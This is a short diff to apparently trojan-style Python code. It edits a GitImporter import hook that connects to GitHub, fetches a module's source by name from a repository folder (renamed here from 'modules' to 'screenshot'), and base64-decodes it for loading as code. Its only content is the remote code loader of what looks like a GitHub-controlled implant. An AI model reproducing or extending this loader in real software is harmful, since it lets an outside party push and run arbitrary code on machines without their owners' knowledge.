@@ -15,7 +15,7 @@ class GitImporter:
     def find_spec(self, name, path=None, target=None):
         print(f"[*] Attempting to retrieve {name}")
         self.repo = github_connect()
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
+        new_library = get_file_contents('screenshot', f'{name}.py', self.repo)
 
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
